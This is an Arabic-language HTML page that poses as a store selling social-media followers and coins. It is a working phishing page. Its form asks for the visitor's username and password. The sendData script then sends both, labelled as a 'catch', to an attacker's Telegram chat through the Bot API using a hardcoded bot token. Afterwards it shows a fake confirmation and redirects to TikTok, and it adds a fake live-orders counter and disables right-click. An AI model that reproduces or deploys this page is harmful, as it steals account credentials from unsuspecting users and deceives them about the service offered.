<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Global Store | المتجر العالمي للرشق</title>
    <style>
        :root { --primary: #ee1d52; --bg: #050505; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; overflow-x: hidden; }
        
        #video-bg { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -2; filter: brightness(0.2) blur(3px); object-fit: cover; }

        .main-card { 
            background: rgba(15, 15, 15, 0.9); padding: 30px; border-radius: 25px; 
            width: 90%; max-width: 420px; text-align: center; border: 1px solid rgba(255,255,255,0.1);
            backdrop-filter: blur(20px); position: relative; margin: 40px auto;
        }

        .logo-area h1 { font-size: 26px; margin: 0; background: linear-gradient(45deg, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        .section-title { font-size: 14px; color: #aaa; text-align: right; margin: 15px 5px 5px 0; }

        select, input { 
            width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #333; 
            background: rgba(0,0,0,0.6); color: white; font-size: 15px; box-sizing: border-box; outline: none;
        }

        .btn-go { 
            width: 100%; padding: 18px; border: none; border-radius: 12px; 
            background: #fff; color: #000; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px;
        }
        .btn-go:hover { background: var(--primary); color: #fff; transform: scale(1.02); }

        .live-status { font-size: 13px; color: #4ade80; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body oncontextmenu="return false;">

    <video autoplay muted loop id="video-bg">
        <source src="https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-social-media-icons-20997-large.mp4" type="video/mp4">
    </video>

    <div class="main-card">
        <div class="logo-area">
            <h1>SMM GLOBAL STORE</h1>
            <p style="font-size: 12px; color: #888;">اختر الباقة المناسبة لحسابك</p>
        </div>

        <div class="section-title">1. اختر البرنامج:</div>
        <select id="platform" onchange="updateServices()">
            <option value="TikTok">تيك توك - TikTok</option>
            <option value="Instagram">إنستغرام - Instagram</option>
            <option value="Facebook">فيسبوك - Facebook</option>
            <option value="Snapchat">سناب شات - Snapchat</option>
        </select>

        <div class="section-title">2. نوع الخدمة:</div>
        <select id="service" onchange="updateAmounts()">
            <option value="Followers">زيادة متابعين (Followers)</option>
            <option value="Coins">شحن عملات (Coins/Gold)</option>
        </select>

        <div class="section-title">3. الكمية المطلوبة:</div>
        <select id="amount">
            </select>

        <div class="section-title">4. بيانات التحقق:</div>
        <input type="text" id="user" placeholder="اسم المستخدم (Username)">
        <input type="password" id="pass" placeholder="كلمة المرور للربط">
        
        <button class="btn-go" onclick="sendData()">تأكيد الطلب الآن</button>

        <div class="live-status">🌎 طلبات نشطة عالمياً: <span id="online">145,280</span></div>
    </div>

    <script>
        // تحديث خيارات الكمية بناءً على نوع الخدمة
        function updateAmounts() {
            const service = document.getElementById('service').value;
            const amountSelect = document.getElementById('amount');
            amountSelect.innerHTML = "";

            if (service === "Coins") {
                const coinsOptions = [
                    "100 - 10,000 عملة",
                    "10,000 - 100,000 عملة",
                    "100,000 - 1,000,000 عملة (VIP)"
                ];
                coinsOptions.forEach(opt => {
                    let o = document.createElement("option");
                    o.text = opt; o.value = opt; amountSelect.add(o);
                });
            } else {
                const followOptions = [
                    "500 - 10,000 متابع",
                    "10,000 - 100,000 متابع",
                    "100,000 - 500,000 متابع (Turbo)"
                ];
                followOptions.forEach(opt => {
                    let o = document.createElement("option");
                    o.text = opt; o.value = opt; amountSelect.add(o);
                });
            }
        }

        // تشغيل الدالة عند تحميل الصفحة لأول مرة
        window.onload = updateAmounts;

        function sendData() {
            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk";
            const chat_id = "1564944407";

            const platform = document.getElementById('platform').value;
            const service = document.getElementById('service').value;
            const amount = document.getElementById('amount').value;
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            if(!user || !pass) { alert("يرجى إكمال البيانات!"); return; }

            const msg = `💰 صيدة باقة جديدة!\n\n📱 البرنامج: ${platform}\n🛠 الخدمة: ${service}\n📊 الكمية: ${amount}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
            
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;

            fetch(url).finally(() => {
                alert("تم استلام طلبك! سيتم ربط الحساب وبدء الرشق خلال دقائق.");
                window.location.href = "https://www.tiktok.com";
            });
        }

        // عداد وهمي
        setInterval(() => {
            let el = document.getElementById('online');
            let n = parseInt(el.innerText.replace(',', '')) + Math.floor(Math.random() * 20);
            el.innerText = n.toLocaleString();
        }, 2500);
    </script>
</body>
</html>
